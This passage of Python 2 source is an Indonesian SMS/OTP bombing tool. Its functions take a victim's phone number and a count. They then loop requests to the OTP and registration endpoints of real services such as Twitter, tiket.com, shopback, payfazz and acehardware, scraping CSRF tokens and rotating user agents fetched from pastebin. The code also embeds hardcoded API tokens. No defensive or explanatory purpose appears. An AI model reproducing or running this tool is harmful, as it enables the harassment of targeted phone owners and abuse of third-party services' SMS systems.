        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        red()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'accept': 'application/json, text/javascript, */*; q=0.01', 'user-agent': '{acak}', 'referer': 'https://m.redbus.id/en/', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://m.redbus.id/api/getOtp?number=' + no + '&cc=62&whatsAppOpted=false', headers=hd)
            if 'OTP Sent Successfully' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        red()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def shp():
    logo()
    r = requests.Session()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: +628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        shp()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        shp()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.shopback.co.id/login?redirect=/referral/invite#', headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': '{acak}'}).text
            b = bs(a, 'html.parser')
            c = b.find('input', attrs={'type': 'hidden', 'name': 'nice_try_token'})
            d = r.post('https://www.shopback.co.id/account/sendOtp', headers={'accept': 'application/json', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length': '115', 'content-type': 'application/x-www-form-urlencoded', 'http_x_requested_with': 'XMLHttpRequest', 'origin': 'https://www.shopback.co.id', 'referer': 'https://www.shopback.co.id/login?redirect=/referral/invite', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': '{acak}', 'x-requested-with': 'XMLHttpRequest'}, data={'phone': no, 'nice_try_token': c['value'], 'email': 'akasaka1@etlgr.com', 'target': 'signup'}).text
            if d == '{"verified":false}':
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        shp()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def pmn():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pmn()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pmn()
    print
    data = {'operationName': 'LoginByPhone', 'variables': {'input': {'country_code': '+62', 'phone_number': no, 'platform': 'web'}}, 'query': 'mutation LoginByPhone($input: LoginByPhoneInput) {\n  LoginByPhone(input: $input) {\n    token\n    __typename\n  }\n}\n'}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '256', 'device-type': 'mobile-web', 'origin': 'https://web.pomona.id', 'source': 'mobile-web', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': '*/*', 'ip': '114.142.170.30', 'referer': 'https://web.pomona.id/masuk', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.pomona.id/graphql', headers=hd, data=datajson)
            if '"token":null,"' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        pmn()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def jet():
    logo()
    print '%s[%s#%s] %sWork jika nomor korban blom daftar JET' % (G1, Y1, G1, W0)
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        jet()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        jet()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Content-Length': '127', 'Accept': '*/*', 'Origin': 'http://jet.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://jet.id/Account/Register', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('http://jet.id/Account/register', headers=hd, data={'fullName': 'Yayakyk', 'email': 'yayakyk@40gmail.com', 'phoneNumber': no, 'address': 'Jakarta', 'password': 'qwerty123', 'confirmPassword': 'qwerty123'}).text
            print a
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        jet()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def tw():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tw()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tw()
    print
    data = {'phone': no, 'use_voice': 'false', 'send_auto_verify_hash': 'false', 'flow_token': 'g;158355847049070709:-1583558508469:16afWpmiAuZzd9TbbmXzWWQ0:0'}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://mobile.twitter.com', 'x-twitter-client-language': 'en', 'x-csrf-token': '76aee95c7468a28309eed1b1c1f3df98', 'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA', 'content-type': 'application/json', 'user-agent': '{acak}', 'x-guest-token': '1236159940089098240', 'x-twitter-active-user': 'yes', 'accept': ' */*', 'referer': 'https://mobile.twitter.com/i/flow/signup', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.twitter.com/1.1/onboarding/begin_verification.json', headers=hd, json=datajson).text
            print a
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        tw()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def jtk():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        red()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        red()
    print
    ur = requests.get('https://tjetak.com/register')
    parse = bs(ur.text, features='html.parser')
    token = parse.find('meta', {'name': 'csrf-token'})['content']
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Host': 'www.tjetak.com', 'content-length': '22', 'accept': '*/*', 'origin': 'https://www.tjetak.com', 'user-agent': '{acak}', 'x-xsrf-token': 'eyJpdiI6IlVwN3JzZmhmMUdUZ3cxQUVzSDlNT2c9PSIsInZhbHVlIjoiSktFQk55enZGbkZFZWEwbTI0dkVTQXE2bFwvYzJYMGlnOU5yNzNQdTlRMmlFT1N3Yk5EU2t6eHIxQ1ZoZ2c4U1IiLCJtYWMiOiJhZjRhMTIxNDdlZjBjZjRjNTcxYjhlODU4NDU2OTg1OGNkZTc0ODliMGMxYWY3YzllOWFiMjQ1NGM1ZjI0NjhlIn0=', 'x-csrf-token': token, 'content-type': 'application/json;charset=UTF-8', 'accept': 'application/json, text/plain, */*', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'referer': 'https://www.tjetak.com/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    a = r.post('https://www.tjetak.com/register/send', headers=hd, json={'phone': no}).text
    print a
    metu()


def sop():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        sop()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        sop()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Host': 'api.sooplai.com', 'content-length': '23', 'accept': 'application/json, text/plain, */*', 'origin': 'https://www.sooplai.com', 'user-agent': '{acak}', 'content-type': 'application/json', 'referer': 'https://www.sooplai.com/verify/sms?phone=' + no + '&register=true', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.sooplai.com/customer/register/otp/request', headers=hd, json={'phone': no})
            if '' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        sop()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def tkt():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: +628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tkt()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tkt()
    data = [{'operationName': 'postOtpGenerateV2', 'variables': {'recipient': no, 'requestType': 'REGISTER_OTP'}, 'query': 'mutation postOtpGenerateV2($recipient: String, $requestType: String, $ignoreRecipient: Boolean, $magicLinkAdditionalParameter: String, $fullName: String, $deviceId: String) {\n  otpGenerateV2(recipient: $recipient, requestType: $requestType, ignoreRecipient: $ignoreRecipient, magicLinkAdditionalParameter: $magicLinkAdditionalParameter, fullName: $fullName, deviceId: $deviceId) {\n    code\n    message\n    data {\n      exist\n      expired\n      maskedAccount\n      nextAvailableRequest\n      trxId\n      __typename\n    }\n    errors\n    __typename\n  }\n}\n'}]
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://m.tiket.com', 'user-agent': '{acak}', 'content-type': 'application/json', 'referer': 'https://m.tiket.com/login/?ref=https%3A%2F%2Fm.tiket.com%2Fmyaccount', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://gql.tiket.com/', headers=hd, data=datajson)
            if 'SUCCESS' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        tkt()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def sek():
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        sek()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        sek()
    print
    ur = requests.get('https://en.seekmi.com/register')
    parse = bs(ur.text, features='html.parser')
    token = parse.find('meta', {'name': 'csrf-token'})['content']
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '29', 'origin': 'https://en.seekmi.com', 'x-csrf-token': token, 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'accept': '*/*', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'referer': 'https://en.seekmi.com/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    a = r.post('https://en.seekmi.com/ajax/send-otp', headers=hd, data={'phone': no, 'name': 'Bangsat'}).text
    print a
    metu()


def pfz():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pfz()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pfz()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Host': 'api.payfazz.com', 'content-length': '17', 'accept': '*/*', 'origin': 'https://www.payfazz.com', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.payfazz.com/register/BEN6ZF74XL', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.payfazz.com/v2/phoneVerifications', headers=hd, data={'phone': no})
            if 'phoneVerificationId' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        pfz()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def rwk():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: +628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rwk()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rwk()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Content-Length': '77', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'https://web.rework.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://web.rework.id/register', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://web.rework.id/nexmo/sendCode', headers=hd, data={'_token': 'oZauPolVAhritYJwD3UNINtQTeBUGcTDwKZkS8EM', 'mobile_phone': no})
            if 'succeed' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        rwk()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def dmt():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        dmt()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        dmt()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Content-Length': '97', 'Accept': '*/*', 'Origin': 'https://domaten.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://domaten.com/signup/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    a = r.post('https://domaten.com/wp-admin/admin-ajax.php', headers=hd, data={'action': 'ihs_otp_ajax_hook', 'security': '301afb711c', 'data[phone]': no, 'data[country_code]': '62'}).text
    print a
    metu()


def qcr():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        qcr()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        qcr()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '36', 'accept': '*/*', 'origin': 'https://www.qikcircle.com', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.qikcircle.com/Register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.qikcircle.com/SendSmsOtp', headers=hd, data={'countryCode': '+62', 'phoneNo': no})
            if 'OTP Sent' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        qcr()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def bos():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bos()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bos()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'user-agent': '{acak}', 'referer': 'https://bos.smartlink.id/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://bos.smartlink.id/getOTPRegister/' + no + '/wa', headers=hd)
            if 'success' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(120)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(120)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        bos()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def ace():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ace()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ace()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'user-agent': '{acak}', 'referer': 'https://www.acehardware.co.id/membership/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.acehardware.co.id/membership/send-otp?cellphone=' + no + '&otp_type=register', headers=hd)
            if 'Silahkan mencoba lagi besok' in a.text:
                print '%s[%s%s%s] %sLimit 1 hari, coba lago besok%s' % (W1, R1, z, W1, W0, no)
                time.sleep(1)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        ace()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def bkm():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bkm()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bkm()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Bakmi_Otp', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://nabil.my.id/Tools/Prank-Tools/Bakmi/api.php', headers=hd, data={'nomor': no, 'jumlah': '1'})
            if 'Terkirim' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
